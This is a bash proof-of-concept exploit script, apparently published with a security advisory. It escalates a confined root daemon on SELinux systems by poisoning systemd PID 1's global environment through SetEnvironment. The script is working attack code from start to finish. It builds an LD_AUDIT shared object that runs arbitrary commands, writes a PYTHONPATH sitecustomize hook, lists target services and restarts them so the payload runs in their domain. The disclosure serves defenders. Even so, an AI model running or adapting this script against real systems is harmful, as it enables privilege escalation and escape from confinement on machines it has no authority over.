#!/bin/bash
#
# LinnemanLabs - environment poisoning PoC (systemd Manager.SetEnvironment)
#
# https://linnemanlabs.com/posts/confined-root-is-still-root/
# https://github.com/linnemanlabs/advisories/
#
#
# a confined uid-0 daemon that holds the grant init_t:system reload (granted so it can ask
# PID 1 to reload) poisons PID 1's GLOBAL environment via SetEnvironment, then restarts a target
# service so the poison executes our code in that service'S SELinux domain.
#
# noatsecure is granted to init_t->domain, so AT_SECURE is cleared on transition and LD_* is used.
#
# VARS:
#   METHOD=ld_audit|python
#   STAGE=<only for python method, directory our confined domain can write>
#   TARGET=<service to start to run with our ENV vars>
#   CMD=<shell commands to run, set at build step only>
#
# MODES:
#   MODE=build   (off-box) compile the LD_AUDIT auditor .so with CMD built-in. transfer the .so to
#                the target. a strict confined domain usually can't run cc, so build off-box.
#                only needed for the ld_audit method not the python method.
#   MODE=fire    (on target) poison env var with chosen method. ld_audit method uses the prebuilt .so
#                and restarts the target service LD_AUDIT= env var, python mode uses PYTHONPATH to
#                execute a script from.
#
# METHODS:
#   ld_audit  (default) LD_AUDIT + a small .so to run our commands. the .so build is done off-box (a strict
#             confined domain likely cannot run the build steps) and transferred in. lot of targets.
#   python    PYTHONPATH + sitecustomize.py  -> needs a python target (blivet/lvmdbusd). no compiler.
#             if the service runs python3 -E, that makes python ignore PYTHONPATH. not a lot of targets.
#
# example:
#   (build) : MODE=build ./env-poison.sh
#   ... transfer env-poison-audit.so to target
#   (fire)  : AUDIT_SO=/var/lib/logrotate/env-poison-audit.so ./env-poison.sh
#
set -eu
MODE="${MODE:-fire}"
METHOD="${METHOD:-ld_audit}"
# path our confined service can write, that target service can read
STAGE="${STAGE:-/var/lib/logrotate}"
WAIT="${WAIT:-6}"
SD="org.freedesktop.systemd1 /org/freedesktop/systemd1 org.freedesktop.systemd1.Manager"

# payload run in the target's domain. runs under the target services real systemd confinement so be aware
# note: for ld_audit method CMD is embedded in C system("...") - keep it double-quote-free (or escape for C).
# that also means cmd is set at build-time for ld_audit, not exec-time like python method
# also note: writing to /proc/1/root/tmp here, more of our target list runs ProtectSystem than drops ptrace caps
# you will want to test your target services, no log may not mean no execution depending on where you tried to write
DEFAULT_CMD='{ id; grep ^Cap /proc/self/status; } > /proc/1/root/tmp/env.out'
CMD=${CMD:-$DEFAULT_CMD}
# build the .so (off-box)
if [ "${MODE}" = build ]; then
  OUT="${AUDIT_SO:-./env-poison-audit.so}"
  command -v cc >/dev/null 2>&1 || { echo "[-] build needs a compiler (cc/gcc)"; exit 1; }
  SRC="$( mktemp --suffix=.c )"
  cat > "${SRC}" <<EOF
#define _GNU_SOURCE
#include <stdlib.h>
__attribute__((constructor)) static void go(void){
  /* unset so cmd does not inherit LD_AUDIT */
  unsetenv("LD_AUDIT");
  system("${CMD}");
}
/* make this .so a valid auditor */
unsigned int la_version(unsigned int v){ return v; }
EOF
  cc -shared -fPIC -o "${OUT}" "${SRC}"; rm -f "${SRC}"
  echo "[+] built ${OUT}"
  echo "    put it on the target in a dir the target can map then run there:"
  echo "    AUDIT_SO=<path-on-target> [TARGET=<svc>] $0"
  exit 0
fi

# pick known targets if none given: daemons that run ELF binary, as root, in unconfined domain, with low systemd confinement
if [ -z "${TARGET:-}" ]; then
  for c in uresourced.service com.redhat.Yggdrasil1.Worker1.package_manager.service lvm2-monitor.service; do
    if [ -f "/usr/lib/systemd/system/${c}" ] || [ -f "/etc/systemd/system/${c}" ]; then TARGET="${c}"; break; fi
  done
fi
[ -n "${TARGET:-}" ] || { echo "[-] set TARGET=<native-ELF root svc in an unconfined/privileged domain>"; exit 1; }

ENV_VAR=""; STAGED=()
cleanup(){
  if [ -n "${ENV_VAR}" ]; then busctl call ${SD} UnsetEnvironment as 1 "${ENV_VAR}" >/dev/null 2>&1 || true; fi
  rm -f ${STAGED[@]+"${STAGED[@]}"} 2>/dev/null || true
  echo "[*] cleanup: unset ${ENV_VAR:-<none>} in PID 1 env, removed staged files"
}
# trap cleanup in case set -eu causes us to exit mid-work we dont leave weird state on system
trap cleanup EXIT

case "${METHOD}" in
  ld_audit)
    : "${AUDIT_SO:?MODE=fire ld_audit needs AUDIT_SO=/path/to/env-poison-audit.so (make one with MODE=build)}"
    [ -f "${AUDIT_SO}" ] || { echo "[-] AUDIT_SO not found on target: ${AUDIT_SO}"; exit 1; }
    ENV_VAR="LD_AUDIT"; ENV_VAL="${AUDIT_SO}"
    ;;
  python)
    ENV_VAR="PYTHONPATH"; ENV_VAL="${STAGE}"
    PAYLOAD="${STAGE}/payload.sh"; HOOK="${STAGE}/sitecustomize.py"; STAGED=( "${PAYLOAD}" "${HOOK}" )
    printf '%s\n' "${CMD}" > "${PAYLOAD}"
    cat > "${HOOK}" <<EOF
import os
# don't re-poison
os.environ.pop("PYTHONPATH", None)
os.system("/bin/sh ${PAYLOAD}")
EOF
    ;;
  *) echo "[-] unknown METHOD='${METHOD}' (use: ld_audit | python)"; exit 1 ;;
esac
echo "[*] mode=fire method=${METHOD} target=${TARGET} poison=${ENV_VAR}"

echo "[*] setting global environment variable"
busctl call ${SD} SetEnvironment as 1 "${ENV_VAR}=${ENV_VAL}"
echo "[+] set ${ENV_VAR}=${ENV_VAL} in PID 1 global env"

echo "[*] restarting service ${TARGET}"
busctl call ${SD} RestartUnit ss "${TARGET}" replace
echo "[*] restarted ${TARGET}, giving it ${WAIT}s to fork+fire, then unpoisoning..."

sleep "${WAIT}"
echo "[+] done - check /tmp/env.out for output (from main mount namespace)"

exit 0
# trap cleanup: UnsetEnvironment + remove staged files
